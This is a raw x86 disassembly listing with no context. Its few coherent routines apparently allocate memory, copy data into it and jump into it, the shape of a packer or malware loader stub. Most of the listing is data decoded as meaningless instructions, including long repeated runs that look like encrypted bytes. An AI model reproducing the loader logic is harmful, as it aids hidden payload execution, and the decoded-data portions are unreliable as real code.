  415214:	and    DWORD PTR [ebx],eax
  415216:	push   ds
  415217:	in     al,dx
  415218:	or     al,0xde
  41521a:	lods   al,BYTE PTR ds:[esi]
  41521b:	mov    ?,WORD PTR [ebp+0x40]
  41521e:	sub    al,0x7e
  415220:	sub    BYTE PTR [ebx-0xf],dl
  415223:	dec    esp
  415224:	push   0x27024083
  415229:	and    ebx,edi
  41522b:	and    ecx,eax
  41522d:	jns    0x41527d
  41522f:	xor    al,0xd2
  415231:	cld    
  415232:	and    eax,DWORD PTR [esi+0x13a41a28]
  415238:	int    0xae
  41523a:	xchg   esi,eax
  41523b:	mov    DWORD PTR [ecx-0x644ade1b],eax
  415241:	(bad)  
  415242:	mov    cl,0x41
  415244:	mov    ah,BYTE PTR [ebx-0x17]
  415247:	(bad)  
  415249:	push   esi
  41524a:	sbb    al,0x41
  41524c:	sbb    ebp,esp
  41524e:	pop    eax
  41524f:	int3   
  415250:	shl    BYTE PTR [ecx],1
  415252:	jb     0x415216
  415254:	lods   al,BYTE PTR ds:[esi]
  415255:	cmp    BYTE PTR [ebx+esi*2],bh
  415258:	ret    
  415259:	bound  edi,QWORD PTR [ebx+0x420442f3]
  41525f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415260:	cmp    DWORD PTR [esi+0x5cb82484],0x3492becf
  41526a:	jno    0x415236
  41526c:	jg     0x4152b6
  41526e:	lahf   
  41526f:	sbb    DWORD PTR [edi+0x7d],ebx
  415272:	mov    al,ds:0xd88895e0
  415277:	pop    esp
  415278:	ins    BYTE PTR es:[edi],dx
  415279:	sub    cl,BYTE PTR [esi-0x450e1ebd]
  41527f:	add    DWORD PTR [eax+0x6420af90],esp
  415285:	cmp    al,BYTE PTR [edi+edi*8-0x67]
  415289:	out    dx,al
  41528a:	xchg   esp,eax
  41528b:	adc    al,0xa7
  41528d:	leave  
  41528e:	lock aaa 
  415290:	mov    dl,0x7d
  415292:	mov    eax,ds:0xc47caae0
  415297:	push   esp
  415298:	xchg   ebx,eax
  415299:	xchg   ecx,eax
  41529a:	loopne 0x41525f
  41529c:	retf   
  41529d:	out    dx,al
  41529e:	jbe    0x41524b
  4152a0:	ds lahf 
  4152a2:	fmul   QWORD PTR [ecx]
  4152a4:	ds enter 0xd938,0x33
  4152a9:	add    eax,0xd1cc2cfa
  4152ae:	loopne 0x4152c3
  4152b0:	adc    DWORD PTR [ecx+ebp*2+0x39ad6615],ebx
  4152b7:	test   al,0x32
  4152b9:	aaa    
  4152ba:	mov    ebx,0x8ddeb224
  4152bf:	dec    eax
  4152c0:	stc    
  4152c1:	(bad)  
  4152c2:	mov    BYTE PTR [ebp+0x15b7e10e],bl
  4152c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152c9:	data16 mov bh,0xf4
  4152cc:	and    BYTE PTR [edx],dl
  4152ce:	not    BYTE PTR [edi]
  4152d0:	mov    ss,WORD PTR [ecx-0x48]
  4152d3:	dec    eax
  4152d4:	lds    ecx,FWORD PTR [ebx]
  4152d6:	call   DWORD PTR ds:0x417014
  4152dc:	mov    DWORD PTR [ebp-0x2c],eax
  4152df:	movzx  eax,WORD PTR [ebp-0x2c]
  4152e3:	cmp    eax,0x539
  4152e8:	jne    0x415319
  4152ea:	mov    DWORD PTR [ebp-0x14],0xe0d
  4152f1:	lea    ecx,[ebp-0x28]
  4152f4:	push   ecx
  4152f5:	call   DWORD PTR ds:0x417018
  4152fb:	mov    DWORD PTR [ebp-0x60],eax
  4152fe:	mov    DWORD PTR [ebp-0x54],0x3a
  415305:	mov    BYTE PTR [ebp-0x34],0x0
  415309:	mov    DWORD PTR [ebp-0x8],0xdca5206d
  415310:	mov    DWORD PTR [ebp-0x68],0x122d67
  415317:	jmp    0x41532e
  415319:	mov    BYTE PTR ds:0x417038,0x0
  415320:	push   0x42cfc8
  415325:	call   DWORD PTR ds:0x417018
  41532b:	mov    DWORD PTR [ebp-0x2c],eax
  41532e:	push   0x0
  415330:	call   DWORD PTR ds:0x417018
  415336:	mov    DWORD PTR [ebp-0x2c],eax
  415339:	push   DWORD PTR ds:0x417018
  41533f:	pop    edx
  415340:	mov    DWORD PTR [ebp-0x6c],edx
  415343:	lea    edx,[ebp-0x40]
  415346:	push   edx
  415347:	mov    eax,DWORD PTR [ebp-0x60]
  41534a:	push   eax
  41534b:	call   DWORD PTR ds:0x417024
  415351:	mov    DWORD PTR [ebp-0x44],eax
  415354:	push   DWORD PTR [ebp-0x30]
  415357:	push   0x1000
  41535c:	mov    eax,DWORD PTR [ebp-0x14]
  41535f:	add    eax,0x23
  415362:	add    eax,0x23
  415365:	push   eax
  415366:	xor    eax,eax
  415368:	push   eax
  415369:	mov    ecx,DWORD PTR [ebp-0x44]
  41536c:	call   ecx
  41536e:	push   eax
  41536f:	pop    ecx
  415370:	mov    DWORD PTR [ebp-0x4],ecx
  415373:	mov    ecx,DWORD PTR [ebp-0x68]
  415376:	sub    ecx,0xdae0b
  41537c:	mov    DWORD PTR [ebp-0x68],ecx
  41537f:	cmp    DWORD PTR [ebp-0x4],0x0
  415383:	jne    0x41539d
  415385:	push   0x0
  415387:	push   0x0
  415389:	call   0x416a5c
  41538e:	push   0x0
  415390:	call   DWORD PTR ds:0x41702c
  415396:	mov    BYTE PTR ds:0x447f40,0x0
  41539d:	mov    edx,DWORD PTR [ebp-0x4]
  4153a0:	add    edx,DWORD PTR [ebp-0x14]
  4153a3:	mov    eax,DWORD PTR [ebp-0x8]
  4153a6:	mov    DWORD PTR [edx],eax
  4153a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4153ab:	add    ecx,DWORD PTR [ebp-0x54]
  4153ae:	mov    DWORD PTR [ebp-0x5c],ecx
  4153b1:	mov    edx,DWORD PTR ds:0x417024
  4153b7:	mov    DWORD PTR [ebp-0x4c],edx
  4153ba:	mov    eax,DWORD PTR [ebp-0x4]
  4153bd:	add    eax,DWORD PTR [ebp-0x14]
  4153c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4153c3:	mov    DWORD PTR [eax+0x4],ecx
  4153c6:	mov    edx,DWORD PTR [ebp-0x4]
  4153c9:	add    edx,DWORD PTR [ebp-0x14]
  4153cc:	mov    DWORD PTR [ebp-0xc],edx
  4153cf:	cmp    DWORD PTR [ebp-0x68],0x0
  4153d3:	jbe    0x4153f0
  4153d5:	mov    eax,DWORD PTR [ebp-0xc]
  4153d8:	push   eax
  4153d9:	mov    ecx,DWORD PTR [ebp-0x14]
  4153dc:	push   ecx
  4153dd:	mov    edx,DWORD PTR [ebp-0x2c]
  4153e0:	add    edx,DWORD PTR [ebp-0x68]
  4153e3:	push   edx
  4153e4:	mov    eax,DWORD PTR [ebp-0x4]
  4153e7:	push   eax
  4153e8:	call   0x41696e
  4153ed:	add    esp,0x10
  4153f0:	cmp    DWORD PTR [ebp-0x5c],0x0
  4153f4:	je     0x415404
  4153f6:	push   DWORD PTR [ebp-0x4c]
  4153f9:	push   DWORD PTR [ebp-0x6c]
  4153fc:	mov    ecx,DWORD PTR [ebp-0x5c]
  4153ff:	push   ecx
  415400:	jmp    ecx
  415402:	jmp    0x41540a
  415404:	mov    ecx,DWORD PTR [ebp+0x8]
  415407:	mov    DWORD PTR [ebp-0x18],ecx
  41540a:	mov    eax,0x1
  41540f:	mov    esp,ebp
  415411:	pop    ebp
  415412:	ret    
  415413:	push   ebp
  415414:	mov    ebp,esp
  415416:	pop    ebp
  415417:	ret    
  415418:	push   ebp
  415419:	mov    ebp,esp
  41541b:	sub    esp,0x54
  41541e:	mov    DWORD PTR [ebp-0x34],0x0
  415425:	mov    DWORD PTR [ebp-0x4],0x0
  41542c:	mov    DWORD PTR [ebp-0x50],0x0
  415433:	mov    DWORD PTR [ebp-0x4c],0x0
  41543a:	mov    DWORD PTR [ebp-0x30],0x0
  415441:	lea    eax,[ebp-0x38]
  415444:	push   eax
  415445:	push   0x8
  415447:	call   DWORD PTR ds:0x417020
  41544d:	call   DWORD PTR ds:0x417014
  415453:	mov    DWORD PTR [ebp-0x30],eax
  415456:	lea    ecx,[ebp-0x48]
  415459:	push   ecx
  41545a:	call   DWORD PTR ds:0x417010
  415460:	mov    edx,DWORD PTR [ebp-0x34]
  415463:	push   edx
  415464:	call   0x415493
  415469:	add    esp,0x4
  41546c:	call   0x41695f
  415471:	mov    DWORD PTR [ebp-0x54],0x0
  415478:	jmp    0x415483
  41547a:	mov    eax,DWORD PTR [ebp-0x54]
  41547d:	add    eax,0x1
  415480:	mov    DWORD PTR [ebp-0x54],eax
  415483:	cmp    DWORD PTR [ebp-0x54],0x64
  415487:	jae    0x41548b
  415489:	jmp    0x41547a
  41548b:	xor    eax,eax
  41548d:	mov    esp,ebp
  41548f:	pop    ebp
  415490:	ret    0x10
  415493:	push   ebp
  415494:	mov    ebp,esp
  415496:	sub    esp,0x3c
  415499:	push   esi
  41549a:	mov    DWORD PTR [ebp-0x3c],0x0
  4154a1:	mov    DWORD PTR [ebp-0x38],0x0
  4154a8:	mov    DWORD PTR [ebp-0x30],0x0
  4154af:	mov    DWORD PTR [ebp-0x24],0x0
  4154b6:	mov    DWORD PTR [ebp-0x1c],0x0
  4154bd:	mov    DWORD PTR [ebp-0x28],0x0
  4154c4:	mov    DWORD PTR [ebp-0x2c],0x448fc8
  4154cb:	mov    DWORD PTR [ebp-0x24],0x96a854dd
  4154d2:	mov    DWORD PTR [ebp-0x34],0x0
  4154d9:	mov    eax,DWORD PTR [ebp-0x24]
  4154dc:	mov    DWORD PTR [ebp-0x20],eax
  4154df:	mov    DWORD PTR [ebp-0x4],0x0
  4154e6:	mov    ecx,DWORD PTR ds:0x417014
  4154ec:	mov    DWORD PTR [ebp-0x4],ecx
  4154ef:	push   0x0
  4154f1:	push   0x4e
  4154f3:	push   0x1e
  4154f5:	push   0x0
  4154f7:	push   0xffffffff
  4154f9:	call   DWORD PTR ds:0x41701c
  4154ff:	test   eax,eax
  415501:	je     0x41693e
  415507:	jns    0x4154ac
  415509:	mov    bh,0x90
  41550b:	push   esi
  41550c:	xchg   ecx,eax
  41550d:	out    0xf8,eax
  41550f:	jge    0x415574
  415511:	sub    BYTE PTR [edi],bl
  415513:	jp     0x4154e0
  415515:	stc    
  415516:	daa    
  415517:	sub    BYTE PTR [ebp-0x6f],dl
  41551a:	out    0xf8,eax
  41551c:	jns    0x415581
  41551e:	sub    BYTE PTR [edi-0x7b],bl
  415521:	xor    al,0xf9
  415523:	daa    
  415524:	nop
  415525:	push   ebp
  415526:	xchg   ecx,eax
  415527:	out    0xf8,eax
  415529:	jns    0x41558e
  41552b:	sub    BYTE PTR [edi],bl
  41552d:	test   DWORD PTR [ecx+edi*8],esi
  415530:	daa    
  415531:	nop
  415532:	push   ebp
  415533:	xchg   ecx,eax
  415534:	out    0xf8,eax
  415536:	jns    0x41559b
  415538:	sub    BYTE PTR [edi],bl
  41553a:	test   DWORD PTR [ecx+edi*8],esi
  41553d:	daa    
  41553e:	nop
  41553f:	push   ebp
  415540:	xchg   ecx,eax
  415541:	out    0xf8,eax
  415543:	jno    0x4155a7
  415545:	sub    BYTE PTR [edi],bl
  415547:	mov    ebp,DWORD PTR [ebx]
  415549:	inc    ebx
  41554a:	sub    DWORD PTR [eax-0x26d5671f],edx
  415550:	shl    DWORD PTR [edx+0x64],0xd2
  415554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415555:	pusha  
  415556:	xchg   ecx,eax
  415557:	dec    esi
  415558:	jecxz  0x4155cf
  41555a:	loope  0x4154f1
  41555c:	xchg   edi,eax
  41555d:	push   ds
  41555e:	adc    DWORD PTR [ecx+0x72],ecx
  415561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415562:	push   edi
  415563:	cwde   
  415564:	dec    ecx
  415565:	(bad)  
  415566:	cmp    ah,ch
  415568:	(bad)  
  415569:	call   0x14eb:0x6a5a431c
  415570:	nop
  415571:	dec    ecx
  415572:	mov    al,0x11
  415574:	fidiv  WORD PTR [eax+ebx*8+0x7a4c0c14]
  41557b:	stos   DWORD PTR es:[edi],eax
  41557c:	cmp    esp,esi
  41557e:	sub    eax,0xe79155b4
  415583:	clc    
  415584:	jns    0x4155e9
  415586:	sub    BYTE PTR [ebp+0x4a],ah
  415589:	and    dh,BYTE PTR [edi+0x19]
  41558c:	ds sub eax,0x156d94c
  415592:	mov    esi,0xe9fdb116
  415597:	fcom   QWORD PTR [esi+esi*2]
  41559a:	mov    BYTE PTR [ebx+0x46a48049],dh
  4155a0:	sbb    ecx,ebp
  4155a2:	pop    eax
  4155a3:	mov    edx,DWORD PTR [edi+0x5f]
  4155a6:	dec    ebp
  4155a7:	jo     0x41554b
  4155a9:	xor    al,0x25
  4155ab:	ins    BYTE PTR es:[edi],dx
  4155ac:	int    0x50
  4155ae:	ret    0xecd4
  4155b1:	sub    bh,dl
  4155b3:	stos   DWORD PTR es:[edi],eax
  4155b4:	sti    
  4155b5:	jmp    0x98f124f4
  4155ba:	cmc    
  4155bb:	sub    BYTE PTR [ebx],ch
  4155bd:	dec    esp
  4155be:	and    al,0x10
  4155c0:	inc    esi
  4155c1:	mov    esi,0x156c24c
  4155c6:	mov    esi,0xe9fcb116
  4155cb:	mov    al,0x88
  4155cd:	call   0x92aaa95a
  4155d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d3:	push   ebx
  4155d4:	xchg   BYTE PTR [edi+0x58],ah
  4155d7:	adc    edx,ecx
  4155d9:	lock dec ebp
  4155db:	sub    al,0x3f
  4155dd:	lahf   
  4155de:	and    eax,0xc2ca505c
  4155e3:	mov    edx,0xb5fa819a
  4155e8:	data16 je 0x415625
  4155eb:	(bad)  
  4155ec:	xlat   BYTE PTR ds:[ebx]
  4155ed:	sbb    esi,ebp
  4155ef:	dec    ebp
  4155f0:	in     al,dx
  4155f1:	push   edi
  4155f2:	xchg   ecx,eax
  4155f3:	sbb    DWORD PTR [esi],edi
  4155f5:	sub    eax,0x79f8e74c
  4155fa:	arpl   WORD PTR [eax],bp
  4155fc:	pop    ds
  4155fd:	test   DWORD PTR [ecx+edi*8],esi
  415600:	daa    
  415601:	nop
  415602:	push   ebp
  415603:	xchg   ecx,eax
  415604:	out    0xf8,eax
  415606:	jns    0x41566b
  415608:	sub    BYTE PTR [edi],bl
  41560a:	test   DWORD PTR [ecx+edi*8],esi
  41560d:	daa    
  41560e:	nop
  41560f:	add    eax,0x35f8e7d4
  415614:	bound  ebp,QWORD PTR [ebx]
  415616:	pop    ds
  415617:	jecxz  0x415693
  415619:	mov    ah,0x68
  41561b:	nop
  41561c:	push   ebp
  41561d:	xchg   ecx,eax
  41561e:	out    0xf8,eax
  415620:	jns    0x415685
  415622:	sub    bh,bh
  415624:	test   DWORD PTR [esi],esi
  415626:	clc    
  415627:	sub    al,0x91
  415629:	pop    edi
  41562a:	xchg   ecx,eax
  41562b:	out    0x1a,eax
  41562d:	jge    0x415692
  41562f:	sub    BYTE PTR [ebx+0x27f93483],bl
  415635:	nop
  415636:	push   ebp
  415637:	rcr    BYTE PTR [edx-0x8],cl
  41563a:	jns    0x41569f
  41563c:	cmp    BYTE PTR [edi],bl
  41563e:	test   DWORD PTR [ecx+edi*8],esi
  415641:	and    dl,BYTE PTR [eax-0x7586eab]
  415647:	jns    0x4156bc
  415649:	sub    BYTE PTR [edi],bl
  41564b:	test   DWORD PTR [esi],esi
  41564d:	stc    
  41564e:	daa    
  41564f:	xchg   ebp,eax
  415650:	push   ebp
  415651:	nop
  415652:	out    0xf8,eax
  415654:	jns    0x4156b9
  415656:	sub    BYTE PTR [edx],bl
  415658:	test   DWORD PTR ds:0x559027f9,esi
  41565e:	xchg   ecx,eax
  41565f:	out    0xc8,eax
  415661:	jne    0x4156c6
  415663:	sub    BYTE PTR [ebx],bl
  415665:	test   DWORD PTR [ebx+esi*8],esi
  415668:	fst    DWORD PTR [ebp+edx*2-0x747186d]
  41566f:	arpl   WORD PTR [eax],bp
  415671:	jne    0x90693fab
  415677:	push   ebp
  415678:	xchg   ecx,eax
  415679:	idiv   eax
  41567b:	jns    0x4156f0
  41567d:	sub    BYTE PTR [edi],bl
  41567f:	test   DWORD PTR [ecx+edi*8],esi
  415682:	daa    
  415683:	adc    BYTE PTR [ebp-0x6f],0xe7
  415687:	clc    
  415688:	jns    0x4156ed
  41568a:	sub    BYTE PTR [edi],bl
  41568c:	test   DWORD PTR [ecx+edi*8],esi
  41568f:	and    edx,DWORD PTR [eax-0x4416ea7]
  415695:	jns    0x4156fa
  415697:	sub    bh,bl
  415699:	mov    ?,WORD PTR [esp+ebp*4]
  41569c:	sbb    BYTE PTR [eax-0x7186eab],dl
  4156a2:	jns    0x415707
  4156a4:	sub    BYTE PTR [edi],bl
  4156a6:	test   DWORD PTR [ecx+edi*8],esi
  4156a9:	daa    
  4156aa:	nop
  4156ab:	push   ebp
  4156ac:	xchg   ecx,eax
  4156ad:	out    0xf8,eax
  4156af:	jns    0x4156f4
  4156b1:	and    al,0x1f
  4156b3:	popf   
  4156b4:	xor    al,0xf9
  4156b6:	daa    
  4156b7:	nop
  4156b8:	push   ebp
  4156b9:	xchg   ecx,eax
  4156ba:	out    0xf8,eax
  4156bc:	jns    0x415721
  4156be:	sub    BYTE PTR [edi],bl
  4156c0:	test   DWORD PTR [ecx+edi*8],esi
  4156c3:	daa    
  4156c4:	nop
  4156c5:	push   ebp
  4156c6:	xchg   ecx,eax
  4156c7:	out    0xf8,eax
  4156c9:	jns    0x41572e
  4156cb:	sub    BYTE PTR [edi],bl
  4156cd:	test   DWORD PTR [ecx+edi*8],esi
  4156d0:	daa    
  4156d1:	nop
  4156d2:	push   ebp
  4156d3:	xchg   ecx,eax
  4156d4:	out    0xf8,eax
  4156d6:	jns    0x41573b
  4156d8:	sub    BYTE PTR [edi],bl
  4156da:	test   DWORD PTR [ecx+edi*8],esi
  4156dd:	daa    
  4156de:	nop
  4156df:	push   ebp
  4156e0:	xchg   ecx,eax
  4156e1:	out    0xf8,eax
  4156e3:	jns    0x415748
  4156e5:	sub    BYTE PTR [edi],bl
  4156e7:	test   DWORD PTR [ecx+edi*8],esi
  4156ea:	daa    
  4156eb:	nop
  4156ec:	push   ebp
  4156ed:	xchg   ecx,eax
  4156ee:	out    0xf8,eax
  4156f0:	jns    0x415755
  4156f2:	sub    BYTE PTR [edi],bl
  4156f4:	test   DWORD PTR [ecx+edi*8],esi
  4156f7:	daa    
  4156f8:	nop
  4156f9:	push   ebp
  4156fa:	xchg   ecx,eax
  4156fb:	out    0xf8,eax
  4156fd:	jns    0x415762
  4156ff:	sub    BYTE PTR [edi],bl
  415701:	test   DWORD PTR [ecx+edi*8],esi
  415704:	daa    
  415705:	nop
  415706:	push   ebp
  415707:	mov    edi,0x17019d93
  41570c:	sub    BYTE PTR [edi],bl
  41570e:	test   DWORD PTR [ecx+ecx*2],esi
  415711:	sub    al,0x90
  415713:	push   ebp
  415714:	and    edi,0x2c0579f8
  41571a:	pop    ds
  41571b:	test   DWORD PTR [eax],esi
  41571d:	stc    
  41571e:	daa    
  41571f:	rcl    BYTE PTR [eax],0xd2
  415722:	aad    0xac
  415724:	arpl   WORD PTR ss:[eax],bp
  415727:	pop    ds
  415728:	test   DWORD PTR [ecx+edi*8],esi
  41572b:	pop    es
  41572c:	nop
  41572d:	push   ebp
  41572e:	jno    0x4156f9
  415730:	mov    cl,BYTE PTR [edx]
  415732:	adc    DWORD PTR [ebx+0x1f],ecx
  415735:	test   DWORD PTR [ecx+edi*8],esi
  415738:	inc    edi
  415739:	nop
  41573a:	push   ebp
  41573b:	xchg   ecx,eax
  41573c:	daa    
  41573d:	repz jns 0x4157a3
  415740:	jp     0x415761
  415742:	test   DWORD PTR [ebx+edx*4],esi
  415745:	and    edx,DWORD PTR [eax-0x7186eab]
  41574b:	jns    0x4157b0
  41574d:	sub    BYTE PTR [edi],bl
  41574f:	test   DWORD PTR [ecx+edi*8],esi
  415752:	daa    
  415753:	mov    al,0x55
  415755:	xchg   ecx,eax
  415756:	pop    es
  415757:	(bad)  
  415758:	or     eax,DWORD PTR [esi]
  41575a:	inc    esp
  41575b:	jo     0x415743
  41575d:	xor    al,0xf9
  41575f:	daa    
  415760:	xchg   edx,eax
  415761:	push   ebp
  415762:	xchg   ecx,eax
  415763:	out    0xd8,eax
  415765:	jne    0x4157ca
  415767:	sub    BYTE PTR ds:0x9bf93485,bl
  41576d:	xchg   esp,eax
  41576e:	push   ebp
  41576f:	xchg   ecx,eax
  415770:	out    0xf8,eax
  415772:	jns    0x4157d7
  415774:	sub    BYTE PTR [edi],bl
  415776:	test   DWORD PTR [ecx+edi*8],esi
  415779:	daa    
  41577a:	nop
  41577b:	adc    eax,0x7938e791
  415780:	arpl   WORD PTR [eax],bp
  415782:	pop    ds
  415783:	test   DWORD PTR [ecx+edi*8],esi
  415786:	daa    
  415787:	nop
  415788:	push   ebp
  415789:	xchg   ecx,eax
  41578a:	out    0xf8,eax
  41578c:	jns    0x4157f1
  41578e:	sub    BYTE PTR [edi],bl
  415790:	test   DWORD PTR [ecx+edi*8],esi
  415793:	daa    
  415794:	nop
  415795:	push   ebp
  415796:	xchg   ecx,eax
  415797:	out    0xf8,eax
  415799:	jns    0x4157fe
  41579b:	sub    BYTE PTR [edi],bl
  41579d:	test   DWORD PTR [ecx+edi*8],esi
  4157a0:	daa    
  4157a1:	nop
  4157a2:	push   ebp
  4157a3:	xchg   ecx,eax
  4157a4:	out    0xf8,eax
  4157a6:	jns    0x41580b
  4157a8:	sub    BYTE PTR [edi],bl
  4157aa:	test   DWORD PTR [ecx+edi*8],esi
  4157ad:	daa    
  4157ae:	nop
  4157af:	push   ebp
  4157b0:	xchg   ecx,eax
  4157b1:	out    0xf8,eax
  4157b3:	jns    0x415818
  4157b5:	sub    BYTE PTR [edi],bl
  4157b7:	test   DWORD PTR [ecx+edi*8],esi
  4157ba:	daa    
  4157bb:	nop
  4157bc:	push   ebp
  4157bd:	xchg   ecx,eax
  4157be:	out    0xf8,eax
  4157c0:	jns    0x415825
  4157c2:	sub    BYTE PTR [edi],bl
  4157c4:	test   DWORD PTR [ecx+edi*8],esi
  4157c7:	daa    
  4157c8:	nop
  4157c9:	push   ebp
  4157ca:	xchg   ecx,eax
  4157cb:	out    0xf8,eax
  4157cd:	jns    0x415832
  4157cf:	sub    BYTE PTR [edi],bl
  4157d1:	test   DWORD PTR [ecx+edi*8],esi
  4157d4:	daa    
  4157d5:	nop
  4157d6:	push   ebp
  4157d7:	xchg   ecx,eax
  4157d8:	out    0xf8,eax
  4157da:	jns    0x41583f
  4157dc:	sub    BYTE PTR [edi],bl
  4157de:	test   DWORD PTR [ecx+edi*8],esi
  4157e1:	daa    
  4157e2:	nop
  4157e3:	push   ebp
  4157e4:	xchg   ecx,eax
  4157e5:	out    0xf8,eax
  4157e7:	jns    0x41584c
  4157e9:	sub    BYTE PTR [edi],bl
  4157eb:	test   DWORD PTR [ecx+edi*8],esi
  4157ee:	daa    
  4157ef:	nop
  4157f0:	push   ebp
  4157f1:	xchg   ecx,eax
  4157f2:	out    0xf8,eax
  4157f4:	jns    0x415859
  4157f6:	sub    BYTE PTR [edi],bl
  4157f8:	test   DWORD PTR [ecx+edi*8],esi
  4157fb:	daa    
  4157fc:	nop
  4157fd:	push   ebp
  4157fe:	xchg   ecx,eax
  4157ff:	out    0xf8,eax
  415801:	jns    0x415866
  415803:	sub    BYTE PTR [edi],bl
  415805:	test   DWORD PTR [ecx+edi*8],esi
  415808:	daa    
  415809:	nop
  41580a:	push   ebp
  41580b:	xchg   ecx,eax
  41580c:	out    0xf8,eax
  41580e:	jns    0x415873
  415810:	sub    BYTE PTR [edi],bl
  415812:	test   DWORD PTR [ecx+edi*8],esi
  415815:	daa    
  415816:	nop
  415817:	push   ebp
  415818:	xchg   ecx,eax
  415819:	out    0xf8,eax
  41581b:	jns    0x415880
  41581d:	sub    BYTE PTR [edi],bl
  41581f:	test   DWORD PTR [ecx+edi*8],esi
  415822:	daa    
  415823:	nop
  415824:	push   ebp
  415825:	xchg   ecx,eax
  415826:	out    0xf8,eax
  415828:	jns    0x41588d
  41582a:	sub    BYTE PTR [edi],bl
  41582c:	test   DWORD PTR [ecx+edi*8],esi
  41582f:	daa    
  415830:	nop
  415831:	push   ebp
  415832:	xchg   ecx,eax
  415833:	out    0xf8,eax
  415835:	jns    0x41589a
  415837:	sub    BYTE PTR [edi],bl
  415839:	test   DWORD PTR [ecx+edi*8],esi
  41583c:	daa    
  41583d:	nop
  41583e:	push   ebp
  41583f:	xchg   ecx,eax
  415840:	out    0xf8,eax
  415842:	jns    0x4158a7
  415844:	sub    BYTE PTR [edi],bl
  415846:	test   DWORD PTR [ecx+edi*8],esi
  415849:	daa    
  41584a:	nop
  41584b:	push   ebp
  41584c:	xchg   ecx,eax
  41584d:	out    0xf8,eax
  41584f:	jns    0x4158b4
  415851:	sub    BYTE PTR [edi],bl
  415853:	test   DWORD PTR [ecx+edi*8],esi
  415856:	daa    
  415857:	nop
  415858:	push   ebp
  415859:	xchg   ecx,eax
  41585a:	out    0xf8,eax
  41585c:	jns    0x4158c1
  41585e:	sub    BYTE PTR [edi],bl
  415860:	test   DWORD PTR [ecx+edi*8],esi
  415863:	daa    
  415864:	nop
  415865:	push   ebp
  415866:	xchg   ecx,eax
  415867:	out    0xf8,eax
  415869:	jns    0x4158ce
  41586b:	sub    BYTE PTR [edi],bl
  41586d:	test   DWORD PTR [ecx+edi*8],esi
  415870:	daa    
  415871:	nop
  415872:	push   ebp
  415873:	xchg   ecx,eax
  415874:	out    0xf8,eax
  415876:	jns    0x4158db
  415878:	sub    BYTE PTR [edi],bl
  41587a:	test   DWORD PTR [ecx+edi*8],esi
  41587d:	daa    
  41587e:	nop
  41587f:	push   ebp
  415880:	xchg   ecx,eax
  415881:	out    0xf8,eax
  415883:	jns    0x4158e8
  415885:	sub    BYTE PTR [edi],bl
  415887:	test   DWORD PTR [ecx+edi*8],esi
  41588a:	daa    
  41588b:	nop
  41588c:	push   ebp
  41588d:	xchg   ecx,eax
  41588e:	out    0xf8,eax
  415890:	jns    0x4158f5
  415892:	sub    BYTE PTR [edi],bl
  415894:	test   DWORD PTR [ecx+edi*8],esi
  415897:	daa    
  415898:	nop
  415899:	push   ebp
  41589a:	xchg   ecx,eax
  41589b:	out    0xf8,eax
  41589d:	jns    0x415902
  41589f:	sub    BYTE PTR [edi],bl
  4158a1:	test   DWORD PTR [ecx+edi*8],esi
  4158a4:	daa    
  4158a5:	nop
  4158a6:	push   ebp
  4158a7:	xchg   ecx,eax
  4158a8:	out    0xf8,eax
  4158aa:	jns    0x41590f
  4158ac:	sub    BYTE PTR [edi],bl
  4158ae:	test   DWORD PTR [ecx+edi*8],esi
  4158b1:	daa    
  4158b2:	nop
  4158b3:	push   ebp
  4158b4:	xchg   ecx,eax
  4158b5:	out    0xf8,eax
  4158b7:	jns    0x41591c
  4158b9:	sub    BYTE PTR [edi],bl
  4158bb:	test   DWORD PTR [ecx+edi*8],esi
  4158be:	daa    
  4158bf:	nop
  4158c0:	push   ebp
  4158c1:	xchg   ecx,eax
  4158c2:	out    0xf8,eax
  4158c4:	jns    0x415929
  4158c6:	sub    BYTE PTR [edi],bl
  4158c8:	test   DWORD PTR [ecx+edi*8],esi
  4158cb:	daa    
  4158cc:	nop
  4158cd:	push   ebp
  4158ce:	xchg   ecx,eax
  4158cf:	out    0xf8,eax
  4158d1:	jns    0x415936
  4158d3:	sub    BYTE PTR [edi],bl
  4158d5:	test   DWORD PTR [ecx+edi*8],esi
  4158d8:	daa    
  4158d9:	nop
  4158da:	push   ebp
  4158db:	xchg   ecx,eax
  4158dc:	out    0xf8,eax
  4158de:	jns    0x415943
  4158e0:	sub    BYTE PTR [edi],bl
  4158e2:	test   DWORD PTR [ecx+edi*8],esi
  4158e5:	daa    
  4158e6:	nop
  4158e7:	push   ebp
  4158e8:	xchg   ecx,eax
  4158e9:	out    0xf8,eax
  4158eb:	jns    0x415950
  4158ed:	sub    BYTE PTR [edi],bl
  4158ef:	test   DWORD PTR [ecx+edi*8],esi
  4158f2:	daa    
  4158f3:	nop
  4158f4:	push   ebp
  4158f5:	xchg   ecx,eax
  4158f6:	out    0xf8,eax
  4158f8:	jns    0x41595d
  4158fa:	sub    BYTE PTR [edi],bl
  4158fc:	test   DWORD PTR [ecx+edi*8],esi
  4158ff:	daa    
  415900:	nop
  415901:	push   ebp
  415902:	xchg   ecx,eax
  415903:	out    0xf8,eax
  415905:	jns    0x41596a
  415907:	adc    DWORD PTR [ecx-0x72],0x34
  41590b:	(bad)  
  41590c:	daa    
  41590d:	nop
  41590e:	inc    ebp
  41590f:	xchg   ecx,eax
  415910:	out    0xd2,eax
  415912:	fstp   TBYTE PTR [ecx+0x7caa25c]
  415918:	jmp    0x415926
  41591a:	stos   DWORD PTR es:[edi],eax
  41591b:	push   0x7f6a527e
  415920:	sub    dh,BYTE PTR [ecx-0x12]
  415923:	pop    ecx
  415924:	xchg   edx,ebp
  415926:	pusha  
  415927:	stos   DWORD PTR es:[edi],eax
  415928:	mov    esp,0x8ba6c49
  41592d:	mov    eax,ds:0x6a1250d2
  415932:	repz shl BYTE PTR es:[esi],1
  415936:	cld    
  415937:	add    al,0x43
  415939:	test   al,0x46
  41593b:	imul   edx,DWORD PTR [esi],0xd
  41593e:	mov    ah,0xee
  415940:	fidiv  DWORD PTR [eax-0x55b5694]
  415946:	xor    eax,0x5283f024
  41594b:	jnp    0x415914
  41594d:	xchg   esp,eax
  41594e:	mov    ax,ds:0x88b6f088
  415954:	xor    DWORD PTR [edi-0x7d],eax
  415957:	bound  esp,QWORD PTR [esi+eiz*2]
  41595a:	xlat   BYTE PTR ds:[ebx]
